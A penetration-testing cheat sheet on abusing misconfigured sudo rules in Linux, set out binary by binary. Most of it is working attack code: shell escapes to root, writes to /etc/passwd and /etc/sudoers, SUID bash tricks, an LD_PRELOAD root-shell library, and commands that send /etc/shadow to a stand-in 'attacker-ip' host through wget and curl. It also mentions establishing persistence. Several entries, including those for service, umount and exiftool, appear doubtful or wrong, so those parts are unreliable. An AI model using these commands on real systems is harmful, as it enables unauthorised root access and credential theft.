# Delegated Privilege Abuse (sudo)

### Overview

**Sudo Privilege Escalation** exploits misconfigured sudo permissions to execute commands as root. When administrators grant sudo access to specific binaries without proper restrictions, attackers can abuse built-in features, file operations, or command injection vulnerabilities to gain root privileges.

**Key Concepts:**

* **NOPASSWD** - Sudo commands that don't require password authentication
* **GTFOBins** - Collection of Unix binaries that can bypass security restrictions
* **Command Injection** - Exploiting sudo commands that execute shell operations
* **Wildcard Exploitation** - Abusing glob patterns in sudo rules
* **Shared Library Hijacking** - Overriding libraries loaded by sudo commands

**Common Attack Vectors:**

* File read/write capabilities
* Command execution features
* Shell escape sequences
* Environment variable manipulation
* Path traversal vulnerabilities

***

### Exploitation Workflow Summary

1. Enumeration ├─ Check sudo permissions (sudo -l) ├─ Identify NOPASSWD entries ├─ Note allowed commands and arguments └─ Check for wildcard patterns
2. Vulnerability Analysis ├─ Research binary capabilities (GTFOBins) ├─ Test for command injection ├─ Identify file operation features └─ Check for shell escape options
3. Exploitation ├─ Execute appropriate technique ├─ Spawn root shell or create SUID binary ├─ Verify root access └─ Establish persistence if needed

***

### Initial Enumeration

**Check sudo permissions:**

```bash
sudo -l
```

**Expected output:**

```
User john may run the following commands on target:
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/wget
    (ALL) NOPASSWD: /usr/bin/systemctl restart apache2
```

**Key indicators:**

* `NOPASSWD` - No password required (easiest to exploit)
* `(root)` - Executes as root
* `(ALL)` - Can run as any user

***

### Sudo Vim

**If allowed:**

```
(root) NOPASSWD: /usr/bin/vim
```

**Exploit - Method 1 (Shell escape):**

```bash
sudo vim -c ':!/bin/bash'
```

**Method 2 (Within vim):**

```bash
sudo vim
# Press Esc, then type:
:set shell=/bin/bash
:shell
```

**Method 3 (Direct command):**

```bash
sudo vim -c ':!bash' -c ':q'
```

***

### Sudo Wget

**If allowed:**

```
(root) NOPASSWD: /usr/bin/wget
```

**Exploit - Overwrite /etc/passwd:**

```bash
# Generate new root user entry
openssl passwd -1 -salt new password123
# Output: $1$new$p7ptkEKU1HnaHpRtzNizS1

# Create malicious passwd file
echo 'hacker:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' > /tmp/passwd

# Overwrite system passwd
sudo wget http://attacker-ip/passwd -O /etc/passwd

# Switch to new user
su hacker
# Password: password123
```

**Method 2 - Post file to attacker:**

```bash
# Read sensitive files
sudo wget --post-file=/etc/shadow http://attacker-ip:8000/

# On attacker:
nc -lvnp 8000
```

***

### Sudo Curl

**If allowed:**

```
(root) NOPASSWD: /usr/bin/curl
```

**Exploit - Read files:**

```bash
sudo curl file:///etc/shadow
sudo curl file:///root/.ssh/id_rsa
```

**Overwrite files:**

```bash
# Create malicious passwd
echo 'hacker:$1$new$HASH:0:0:root:/root:/bin/bash' > /tmp/passwd

# Overwrite
sudo curl file:///tmp/passwd -o /etc/passwd
su hacker
```

**Exfiltrate data:**

```bash
sudo curl -F "file=@/etc/shadow" http://attacker-ip:8000/upload
```

***

### Sudo Git

**If allowed:**

```
(root) NOPASSWD: /usr/bin/git
```

**Exploit - Shell escape:**

```bash
sudo git help status
# Press ! for shell, then:
!/bin/bash
```

**Method 2 - Pre-commit hook:**

```bash
mkdir /tmp/exploit
cd /tmp/exploit
git init
echo '#!/bin/bash' > .git/hooks/pre-commit
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
sudo git commit --allow-empty -m "exploit"
/tmp/rootbash -p
```

***

### Sudo Systemctl

**If allowed:**

```
(root) NOPASSWD: /usr/bin/systemctl
```

**Exploit - Create malicious service:**

```bash
# Create service file
cat << EOF > /tmp/root.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'chmod +s /bin/bash'
[Install]
WantedBy=multi-user.target
EOF

# Enable and start
sudo systemctl link /tmp/root.service
sudo systemctl start root.service

# Use SUID bash
/bin/bash -p
```

**Method 2 - Shell escape:**

```bash
sudo systemctl status apache2
!/bin/bash
```

***

### Sudo Tee

**If allowed:**

```
(root) NOPASSWD: /usr/bin/tee
```

**Exploit - Write to /etc/passwd:**

```bash
openssl passwd -1 -salt new password123
echo 'hacker:$1$new$HASH:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su hacker
```

**Add to sudoers:**

```bash
echo 'user ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers
sudo su
```

***

### Sudo Java

**If allowed:**

```
(root) NOPASSWD: /usr/bin/java
```

**Exploit:**

```bash
# Create Java exploit
cat << EOF > Shell.java
public class Shell {
    public static void main(String[] args) {
        try {
            Runtime.getRuntime().exec("/bin/bash");
        } catch (Exception e) {}
    }
}
EOF

javac Shell.java
sudo java Shell
```

***

### Sudo OpenVPN

**If allowed:**

```
(root) NOPASSWD: /usr/sbin/openvpn
```

**Exploit:**

```bash
# Create config with command injection
cat << EOF > /tmp/exploit.ovpn
script-security 2
up "/bin/bash -c 'chmod +s /bin/bash'"
dev tun
EOF

sudo openvpn /tmp/exploit.ovpn
/bin/bash -p
```

***

### Sudo Screen

**If allowed:**

```
(root) NOPASSWD: /usr/bin/screen
```

**Exploit:**

```bash
sudo screen
# Ctrl+A then :exec .! /bin/bash
```

**Method 2:**

```bash
sudo screen -x root/
```

***

### Sudo Service

**If allowed:**

```
(root) NOPASSWD: /usr/sbin/service
```

**Exploit:**

```bash
sudo service ../../bin/bash
```

***

### Sudo Dstat

**If allowed:**

```
(root) NOPASSWD: /usr/bin/dstat
```

**Exploit:**

```bash
# Create malicious plugin
mkdir -p ~/.dstat
cat << EOF > ~/.dstat/dstat_exploit.py
import os
os.system('chmod +s /bin/bash')
EOF

sudo dstat --exploit
/bin/bash -p
```

***

### Sudo Exiftool

**If allowed:**

```
(root) NOPASSWD: /usr/bin/exiftool
```

**Exploit - Read files:**

```bash
sudo exiftool -filename=/etc/shadow image.jpg
```

***

### Sudo ClamAV

**If allowed:**

```
(root) NOPASSWD: /usr/bin/clamscan
```

**Exploit - Read files:**

```bash
sudo clamscan --copy=/tmp/shadow /etc/shadow
cat /tmp/shadow
```

***

### Sudo Fail2ban

**If allowed:**

```
(root) NOPASSWD: /usr/bin/fail2ban-client
```

**Exploit:**

```bash
# Create action with command injection
cat << EOF > /tmp/exploit.conf
[DEFAULT]
actionban = chmod +s /bin/bash
EOF

sudo fail2ban-client reload
sudo fail2ban-client set sshd addaction exploit
sudo fail2ban-client set sshd action exploit banip 127.0.0.1
/bin/bash -p
```

***

### Sudo Umount

**If allowed:**

```
(root) NOPASSWD: /bin/umount
```

**Exploit - Path traversal:**

```bash
sudo umount /../../../../etc/shadow
```

***

### Sudo Reboot/Shutdown/Poweroff

**If allowed:**

```
(root) NOPASSWD: /sbin/reboot
(root) NOPASSWD: /sbin/shutdown
(root) NOPASSWD: /sbin/poweroff
```

**Exploit - Modify startup scripts before reboot:**

```bash
# If you have write access to rc.local
echo 'chmod +s /bin/bash' >> /etc/rc.local
sudo reboot

# After reboot
/bin/bash -p
```

***

### Sudo Wall

**If allowed:**

```
(root) NOPASSWD: /usr/bin/wall
```

**Exploit - Read files:**

```bash
sudo wall < /etc/shadow
```

***

### Sudoedit

**If allowed:**

```
(root) NOPASSWD: sudoedit /path/to/file
```

**Exploit - Symlink to sensitive files:**

```bash
ln -s /etc/shadow /path/to/file
sudoedit /path/to/file
# Edit and crack hashes
```

***

### Sudo with Shared Library Override

**If allowed with LD\_PRELOAD:**

```
Matching Defaults entries for user on target:
    env_keep+=LD_PRELOAD
```

**Exploit:**

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

**Compile and execute:**

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=./shell.so ANY_SUDO_COMMAND
```

***

### Sudo Path Traversal

**If allowed with wildcards:**

```
(root) NOPASSWD: /usr/bin/script /path/to/scripts/*
```

**Exploit:**

```bash
sudo /usr/bin/script /path/to/scripts/../../etc/shadow
```

***

### Quick Reference

**Enumeration:**

```bash
sudo -l  # Check sudo permissions
```

**Common GTFOBins exploits:**

```bash
# Vim
sudo vim -c ':!/bin/bash'

# Wget
sudo wget http://attacker/passwd -O /etc/passwd

# Git
sudo git help status
!/bin/bash

# Systemctl
sudo systemctl status apache2
!/bin/bash

# Tee
echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers
```

**File operations:**

```bash
# Read with curl
sudo curl file:///etc/shadow

# Write with tee
echo 'DATA' | sudo tee /sensitive/file

# Read with wall
sudo wall < /etc/shadow
```
